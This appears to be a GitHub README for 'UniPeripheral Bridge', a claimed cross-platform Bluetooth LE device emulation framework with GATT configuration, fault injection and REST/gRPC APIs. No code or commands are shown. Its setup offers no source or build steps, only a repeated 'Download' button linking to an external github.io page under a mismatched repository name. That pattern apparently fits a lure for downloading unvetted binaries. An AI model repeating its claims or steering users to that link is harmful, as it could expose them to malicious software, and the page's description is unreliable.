![preview](https://raw.githubusercontent.com/doxxie67/corebluetooth-netem-bridge/main/preview.svg)

# UniPeripheral Bridge

**A cross-platform Bluetooth LE device emulation framework that unifies hardware simulation, test automation, and peripheral orchestration for mobile and embedded development teams.**

---

## Overview

UniPeripheral Bridge emerged from a fundamental challenge: testing Bluetooth Low Energy interactions across platforms is brittle, slow, and fragmented. Existing solutions either lock teams into proprietary hardware labs or force developers to mock network stacks at levels that obscure real-world behavior.

This repository provides a **hardware-agnostic, simulation-first approach** to BLE device development. It abstracts the Bluetooth LE stack into a programmable middleware layer—allowing you to create, spawn, and manage virtual peripherals that speak genuine BLE protocols without requiring physical silicon.

Think of it as a **staging environment for wireless devices**: you define the GATT structure, advertisement payloads, connection intervals, and peripheral state machines in declarative configuration files. The framework then instantiates these devices as software-defined endpoints that any BLE-capable client (mobile app, embedded firmware, web app) can discover, connect to, and interact with—exactly as if they were physical hardware.

---

## Table of Contents

- [Why Another BLE Framework?](#why-another-ble-framework)
- [Core Capabilities](#core-capabilities)
- [Architecture Overview](#architecture-overview)
- [Getting Started](#getting-started)
  - [System Requirements](#system-requirements)
  - [Quick Start Walkthrough](#quick-start-walkthrough)
- [Feature Breakdown](#feature-breakdown)
  - [Virtual Peripheral Designer](#virtual-peripheral-designer)
  - [Multi-Client Orchestration](#multi-client-orchestration)
  - [Traffic Analysis & Replay](#traffic-analysis--replay)
  - [Fault Injection Engine](#fault-injection-engine)
- [Configuration Reference](#configuration-reference)
- [API Documentation](#api-documentation)
- [Use Cases & Workflows](#use-cases--workflows)
- [Compatibility Matrix](#compatibility-matrix)
- [Contributing](#contributing)
- [License](#license)
- [Support & Community](#support--community)
- [Disclaimer](#disclaimer)

---

## Why Another BLE Framework?

Every team shipping BLE-enabled products eventually encounters the **device bottleneck**: you need a dozen different hardware revisions to test thoroughly, but each unit costs time, money, and logistics overhead. Regression testing becomes a scheduling nightmare. CI pipelines cannot spin up physical beacons on demand. Remote collaborators cannot access your device lab at 3 AM.

UniPeripheral Bridge solves this by **decoupling the peripheral identity from the physical radio**. Your development machines become programmable peripheral farms. Your CI runners spawn virtual heart-rate monitors, temperature sensors, and custom accessory profiles as ephemeral Docker containers. Your QA team connects to simulated devices that behave identically to production hardware—including edge cases like battery drain, signal degradation, and connection drops.

The result: test coverage that mirrors real-world diversity without the logistical friction.

[![Download](https://raw.githubusercontent.com/doxxie67/corebluetooth-netem-bridge/main/button.svg)](https://doxxie67.github.io/corebluetooth-netem-bridge/)

---

## Core Capabilities

| Capability | Description |
|---|---|
| **Virtual GATT Designer** | Define services, characteristics, descriptors, and CCCDs in YAML or JSON. Auto-generate compliant peripheral stubs. |
| **Multi-Platform Hosting** | Spawn virtual peripherals via a lightweight daemon that communicates with the operating system’s BLE stack (Windows, macOS, Linux, Android, iOS) |
| **State Machine Simulator** | Model peripheral behavior as finite state machines: advertising intervals, connection monitoring, sleep/wake cycles, and error conditions. |
| **Packet-Level Recording** | Capture, inspect, and replay raw BLE advertisements and connection data streams for forensic analysis or test scenarios. |
| **Fault Injection** | Simulate CRC errors, packet loss, disconnections, invalid attribute writes, and buffer overflows—proactively hardening your client code. |
| **Remote Peripheral Mesh** | Network multiple instances together to simulate complex device ecosystems (e.g., a sensor hub with 5 peripherals, each in different states). |
| **CI/CD Integration** | Headless mode with exit codes, JSON output for test frameworks, and no dependence on physical hardware. |

---

## Architecture Overview

```
+-------------------+       +-------------------+       +----------------------+
|                   |       |                   |       |                      |
|   Client App      | <---> |   UniPeripheral    | <---> |   Native BLE Stack   |
|   (iOS/Android/Win)|       |   Bridge Daemon    |       |   (OS / USB Dongle)  |
|                   |       |                   |       |                      |
+-------------------+       +-------------------+       +----------------------+
                                   |
                                   v
                         +-------------------+
                         |                   |
                         |   Configuration   |
                         |   Repository      |
                         |   (YAML/JSON)     |
                         |                   |
                         +-------------------+
```

The daemon runs as a background service that registers virtual peripherals with the host OS’s Bluetooth subsystem. Each peripheral instance is a lightweight process that responds to GATT requests, emits advertisements, and manages connections—all defined by user-supplied configuration files.

No hardware modification required. No custom drivers. The daemon uses standard HCI commands and platform BLE APIs to simulate authentic behavior.

---

## Getting Started

### System Requirements

- **Supported OS**: Windows 10/11 (build 19041+), macOS 13+ (Ventura), Ubuntu 22.04+, Android 12+ (API 31), iOS 16+ (via companion daemon)
- **BLE Hardware**: Built-in Bluetooth 4.0+ adapter or external USB BLE dongle (CSR, Broadcom, Nordic, TI chipsets)
- **Disk**: 150 MB for runtime + configuration artifacts
- **Memory**: 64 MB per simulated peripheral (base footprint)
- **Privileges**: Administrator/root access for HCI socket binding (Linux), Bluetooth permissions (macOS, Windows)

### Quick Start Walkthrough

1. **Acquire the bridge daemon** from the distribution channel (see [![Download](https://raw.githubusercontent.com/doxxie67/corebluetooth-netem-bridge/main/button.svg)](https://doxxie67.github.io/corebluetooth-netem-bridge/) below).
2. **Define a simple peripheral** in `configs/heart_rate.yaml`:
   ```yaml
   peripheral:
     name: "HRM-Sim-01"
     appearance: 0x0340
     advertisement_interval_ms: 1000
     services:
       - uuid: "180D"
         characteristics:
           - uuid: "2A37"
             properties: [notify]
             value: [0, 90, 75, 80, 72]
   ```
3. **Launch the daemon** with the configuration path.
4. **Scan from your mobile device**—you will see “HRM-Sim-01” advertising.
5. **Connect using any BLE scanner** or your own app. Read or subscribe to the heart-rate measurement characteristic. The daemon will cycle through the defined values.
6. **Modify `value` array** live—the peripheral updates behavior without restarting.

That’s it. No soldering, no lab booking, no silicon.

[![Download](https://raw.githubusercontent.com/doxxie67/corebluetooth-netem-bridge/main/button.svg)](https://doxxie67.github.io/corebluetooth-netem-bridge/)

---

## Feature Breakdown

### Virtual Peripheral Designer

Create realistic device profiles using a human-readable schema. The designer supports:

- Standard 16-bit and 128-bit UUID services
- Custom characteristic properties (read, write, write-no-response, notify, indicate, signed-write)
- Client Characteristic Configuration Descriptor (CCCD) management
- Included services and secondary services
- Metadata fields: local name, manufacturer data, service data, appearance

The designer includes a validation engine that checks your configuration against the Bluetooth Core Specification (v5.4) and alerts you to deviations.

### Multi-Client Orchestration

Simulate complex topologies where multiple clients connect to multiple peripherals simultaneously. For example:

- 3 smartphones pairing with a single virtual thermostat
- 1 tablet scanning for 10 beacons in a warehouse simulation
- 2 wearables simultaneously bonded to a medical device gateway

The orchestrator manages connection parameters, latency, and address resolution across all endpoints.

### Traffic Analysis & Replay

Intercept all BLE traffic flowing through the bridge. Export packet captures in PCAP-NG format for analysis with Wireshark (Wireshark’s BLE dissector understands this format). Import existing captures to replay specific attack vectors or edge cases.

Use cases:
- Regression testing against known failure patterns
- Benchmarking connection throughput under load
- Audit compliance with regulatory advertisement requirements

### Fault Injection Engine

Proactively test your client’s resilience by introducing controlled anomalies:

| Fault Type | Effect |
|---|---|
| CRC Mismatch | Corrupted packet payload causes connection rejection |
| Attribute Write Overflow | Client writes exceed buffer capacity |
| Disconnection Storm | Peripheral drops connection randomly every N seconds |
| Notification Delay | Notifications queue with artificial latency |
| Advertisement Tampering | Beacons emit conflicting service UUIDs |
| Bonding Rejection | Refuse pairing requests at specific security levels |

Each fault can be scoped to a specific peripheral, service, or characteristic—enabling targeted stress testing.

---

## Configuration Reference

Comprehensive documentation for the configuration schema is maintained in the `docs/` directory. Key formats:

- **Peripheral Profile** (`*.peripheral.yaml`): Device identity, GATT structure, advertisement parameters
- **Environment Scenario** (`*.scenario.yaml`): Multi-peripheral topologies, connection rules, fault schedules
- **Orchestration Plan** (`*.orchestra.yaml`): Client behavior simulation (e.g., “scan for 30s, connect, read characteristic, disconnect”)

Each file supports `$include` directives for modular, reusable component libraries.

---

## API Documentation

The bridge exposes both a local socket API and a RESTful HTTP interface:

- **Socket API** (port 8671): Real-time command/response for programmatic peripheral control
- **REST API** (port 8672): JSON-based management of peripheral lifecycle, configuration hot-reload, and status queries
- **gRPC Service** (port 8673): High-throughput streaming for automated test frameworks

Full API references are auto-generated from the proto definitions and available in `docs/api/`.

---

## Use Cases & Workflows

- **Mobile App Testing**: QA engineers simulate a medical thermometer, a cycling power meter, or a smart lock—all from a single laptop. No hardware procurement delays.
- **CI Pipeline**: Your test runner spins up 20 virtual beacons with randomized MAC addresses, validates that your scanning algorithm correctly distinguishes signal strength, then tears them down.
- **Firmware Validation**: Embedded teams attach the bridge to a real chip’s UART interface, tricking the firmware into thinking it’s connected to a full BLE stack.
- **Training & Demos**: Sales engineers demonstrate device pairing workflows using virtual peripherals that look identical to production units.
- **Security Research**: Penetration testers inject malformed advertising packets and observe how clients handle the unexpected.

---

## Compatibility Matrix

| Client Platform | Read | Write | Notify | Indicate | Pairing |
|---|---|---|---|---|---|
| iOS (Swift) | ✅ | ✅ | ✅ | ✅ | ✅ |
| Android (Kotlin) | ✅ | ✅ | ✅ | ✅ | ✅ |
| Windows (C#) | ✅ | ✅ | ✅ | ⚠️ (partial) | ✅ |
| macOS (Swift) | ✅ | ✅ | ✅ | ✅ | ✅ |
| Linux (BlueZ) | ✅ | ✅ | ✅ | ✅ | ✅ |
| Web Bluetooth | ✅ | ✅ | ❌ (not supported) | ❌ | ⚠️ |

---

## Contributing

We welcome contributions that expand peripheral compatibility, improve performance, or extend fault injection capabilities.

- **Bug Reports**: Open an issue with reproduction steps and expected vs. actual behavior.
- **Feature Proposals**: Use the discussion forum to gather feedback before submitting a PR.
- **Pull Requests**: Ensure your changes pass the existing test suite. New features must include unit tests and configuration examples.

All contributions are governed by the Contributor Covenant Code of Conduct.

---

## License

This project is released under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute the software in commercial or private contexts. The full license text is included in the repository root.

---

## Support & Community

- **Documentation**: Full guides, tutorials, and API references live in the `docs/` directory.
- **Discussions**: Use the GitHub Discussions tab for Q&A, show-and-tell, and brainstorming.
- **Office Hours**: Maintainers host monthly virtual sessions (announced in the repository discussions).
- **Email**: For security-related reports, use the disclosure process documented in `SECURITY.md`.

---

## Disclaimer

UniPeripheral Bridge is a simulation and development tool. It is not a substitute for regulatory compliance testing, electromagnetic compatibility certifications, or production-grade BLE integration. Virtual peripherals behave according to user-defined configurations; real-world radio conditions, interference, and hardware variances may produce different results. Always validate against physical devices before deployment to production environments.

The software is provided “as is,” without warranty of any kind, express or implied. The authors are not liable for any damages arising from the use of this tool in safety-critical or life-supporting systems.

*Copyright © 2026 UniPeripheral Bridge contributors. All rights reserved.*

[![Download](https://raw.githubusercontent.com/doxxie67/corebluetooth-netem-bridge/main/button.svg)](https://doxxie67.github.io/corebluetooth-netem-bridge/)